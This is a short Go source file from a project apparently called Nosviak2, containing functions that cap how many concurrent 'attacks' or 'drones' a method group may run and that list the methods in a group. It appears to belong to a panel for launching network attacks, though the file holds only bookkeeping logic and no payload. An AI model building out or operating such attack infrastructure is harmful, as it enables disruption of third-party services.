package attacks

import (
	"Nosviak2/core/database"
	"strings"
)

// MethodAttackSlots will ensure its within the max attacks sendable
func MethodAttackSlots(attk *Method) bool {

	methods := AllMethodInGroup(attk.Options.Group)
	var methodsString []string = make([]string, 0)

	for _, method := range methods {
		methodsString = append(methodsString, method.Name)
	}

	// Grabs the multiply drones
	runningInGroup, err := database.Conn.GrabMultiplyRunning(methodsString)
	if err != nil {
		return false
	}

	// update: added nil pointer checking
	group := FindGroup(attk)
	if group == nil {
		return false
	}

	if group.Conns == 0 {
		return true
	}

	return group.Conns-1 >= len(runningInGroup)
}

// AllMethodInGroup will get all the methods inside that group
func AllMethodInGroup(group string) []Method {
	var src []Method = make([]Method, 0)

	for _, consts := range AllMethods(make([]*Method, 0)) {

		// New: added nil pointer checking into the interface
		if consts == nil || consts.Options == nil {
			continue
		}

		// Lowers both strings and compares them
		if strings.ToLower(consts.Options.Group) == strings.ToLower(group) {
			src = append(src, *consts)
		}
	}

	return src
}
